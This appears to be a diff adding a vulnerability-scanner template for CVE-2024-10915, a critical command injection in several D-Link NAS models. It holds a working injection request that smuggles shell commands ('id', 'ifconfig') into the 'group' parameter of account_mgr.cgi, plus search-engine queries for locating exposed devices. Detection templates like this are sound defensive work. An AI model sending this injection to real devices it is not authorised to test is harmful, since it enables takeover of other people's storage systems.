@@ -1,0 +1,55 @@
+id: CVE-2024-10915
+
+info:
+  name: D-Link NAS - Command Injection via Group Parameter
+  author: s4e-io
+  severity: critical
+  description: |
+    A vulnerability was found in D-Link DNS-320, DNS-320LW, DNS-325 and DNS-340L up to 20241028. It has been rated as critical. Affected by this issue is the function cgi_user_add of the file /cgi-bin/account_mgr.cgi?cmd=cgi_user_add. The manipulation of the argument group leads to os command injection.
+  reference:
+    - https://www.usom.gov.tr/bildirim/tr-24-1836
+    - https://netsecfish.notion.site/Command-Injection-Vulnerability-in-group-parameter-for-D-Link-NAS-12d6b683e67c803fa1a0c0d236c9a4c5?pvs=4
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-10915
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2024-10915
+    cwe-id: CWE-78,CWE-707
+    epss-score: 0.0408
+    epss-percentile: 0.92375
+    cpe: cpe:2.3:o:dlink:dns-320_firmware:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: dlink
+    product: dns-320_firmware
+    shodan-query: http.html:"sharecenter"
+    fofa-query: body="sharecenter"
+  tags: cve,cve2024,dlink,sharecenter,rce
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;{{command}};%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      command:
+        - "id"
+        - "ifconfig"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "regex('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', body)"
+          - "contains_all(body, 'inet addr:', 'Mask:')"
+        condition: or
+
+      - type: dsl
+        dsl:
+          - 'contains(body, "Content-type: text/html")'
+          - "status_code == 200"
+        condition: and
+# digest: 490a00463044022010f4cfdbc2e6e15cb12d81d9ce4c8614912e64d03557fc1defb572036676d39602201835680952be47814364c53e19ee47fcef87e757a96078229563161b4926d13a:922c64590222798bb761d5b6d8e72950
